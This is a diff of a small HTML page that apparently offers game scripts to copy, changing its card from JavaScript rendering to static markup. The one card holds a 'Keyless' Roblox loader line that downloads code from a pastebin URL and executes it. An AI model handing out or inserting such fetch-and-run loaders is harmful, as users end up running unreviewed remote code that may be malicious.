@@ -164,67 +164,37 @@
   //   url: "updated.html?to=" + encodeURIComponent("https://new-real-site.com") + "&name=" + encodeURIComponent("Cool resource")
   // Only that one card changes. Every other card is untouched.
 
-  const items = [
-    {
-      type: "text",
-      tag: "Keyless",
-      title: "Updated Script",
-      windowLabel: "script.txt",
-      content: "loadstring(game:HttpGet("https://pastebin.com/raw/8ysy7ENG",true))()"
-    }
-  ];
+  <div class="card">
+    <span class="tag">Keyless</span>
+    <h2>Updated Script</h2>
+    <div class="terminal">
+      <div class="bar">
+        <span class="dot r"></span>
+        <span class="dot y"></span>
+        <span class="dot g"></span>
+        <span class="bar-label">arsenal.txt</span>
+      </div>
+      <p class="body" id="c1">loadstring(game:HttpGet("https://pastebin.com/raw/8ysy7ENG",true))()</p>
+    </div>
+    <button class="copy-btn" onclick="copyCard('c1', this)">Copy</button>
+  </div>
+  <!-- ================================================= -->
 
-  const container = document.getElementById('cards');
+  <div class="footer">Works on every device · Copy &amp; paste</div>
+</div>
 
-  items.forEach((item, i) => {
-    const card = document.createElement('div');
-    card.className = 'card';
-
-    if (item.type === "link") {
-      card.innerHTML = `
-        <span class="tag">${item.tag}</span>
-        <h2>${item.title}</h2>
-        <div class="terminal">
-          <div class="bar">
-            <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
-            <span class="label">${item.windowLabel}</span>
-          </div>
-          <div class="body">${item.url}</div>
-        </div>
-        <a class="open-btn" href="${item.url}" target="_blank" rel="noopener">Open link</a>
-      `;
-    } else {
-      card.innerHTML = `
-        <span class="tag">${item.tag}</span>
-        <h2>${item.title}</h2>
-        <div class="terminal">
-          <div class="bar">
-            <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
-            <span class="label">${item.windowLabel}</span>
-          </div>
-          <div class="body">${item.content}</div>
-        </div>
-        <button class="copy-btn" data-index="${i}">Copy</button>
-      `;
-    }
-
-    container.appendChild(card);
-  });
-
-  container.addEventListener('click', (e) => {
-    const btn = e.target.closest('.copy-btn');
-    if (!btn) return;
-    const idx = Number(btn.dataset.index);
-    navigator.clipboard.writeText(items[idx].content).then(() => {
-      const original = btn.textContent;
+<script>
+  function copyCard(id, btn) {
+    const text = document.getElementById(id).innerText;
+    navigator.clipboard.writeText(text).then(() => {
       btn.textContent = 'Copied';
       btn.classList.add('copied');
       setTimeout(() => {
-        btn.textContent = original;
+        btn.textContent = 'Copy';
         btn.classList.remove('copied');
       }, 1500);
     });
-  });
+  }
 </script>
 
 </body>
